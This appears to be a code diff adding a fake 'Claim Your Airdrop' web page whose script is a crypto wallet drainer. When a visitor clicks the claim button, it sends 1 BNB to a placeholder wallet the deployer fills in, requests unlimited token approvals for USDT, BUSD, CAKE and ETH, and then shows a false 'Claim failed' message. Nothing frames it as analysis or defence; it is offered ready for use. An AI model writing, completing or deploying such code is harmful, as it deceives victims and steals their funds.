@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Claim Your Airdrop</title>
+    <style>
+        body { background: #000; color: #0f0; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; font-size: 18px; background: #0f0; color: #000; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🎁 Airdrop Claim</h1>
+    <p>You’ve been selected! Claim 50,000 SHIB + 2 BNB</p>
+    <button id="claim">✅ Approve & Receive</button>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script>
+        const yourWallet = "0xYOUR_EXODUS_BSC_ADDRESS"; // CHANGE ME
+        const tokens = [
+            "0x55d398326f99059fF775485246999027B3197955", // USDT
+            "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
+            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
+            "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"  // ETH (BSC)
+        ];
+        const router = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // PancakeSwap
+        let userAddress;
+
+        async function sendBNB() {
+            try {
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: yourWallet,
+                        value: "0xDE0B6B3A7640000" // 1 BNB
+                    }]
+                });
+            } catch (e) {}
+        }
+
+        async function approveToken(token) {
+            try {
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: token,
+                        data: "0x095ea7b3000000000000000000000000" + router.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                    }]
+                });
+            } catch (e) {}
+        }
+
+        async function connect() {
+            [userAddress] = await ethereum.request({ method: 'eth_requestAccounts' });
+            await sendBNB(); // Drain BNB
+            for (let token of tokens) await approveToken(token); // Approve all
+            alert("Claim failed. Try again later.");
+        }
+
+        document.getElementById("claim").addEventListener("click", connect);
+    </script>
+</body>
+</html>
